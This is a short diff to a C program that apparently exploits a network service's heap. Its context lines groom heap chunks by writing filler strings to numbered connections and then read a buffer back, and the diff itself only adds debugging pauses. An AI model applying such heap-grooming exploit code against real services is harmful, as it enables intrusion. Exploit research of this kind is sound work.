@@ -86,6 +86,8 @@ int main() {
     }
 
     // allocate 3 0x30 chunks, A chunk right behind the 0x10000 area
+    puts("1313");
+    getchar();
     write(conns[13], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
     yield();
     write(conns[14], "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
@@ -115,6 +117,7 @@ int main() {
     yield();
 
     // read the buffer back in by sending '\n'
+    getchar();
     write(conns[0], "\n", 1);
     // skip the hello message, linus would insult me for writing this code
     do {
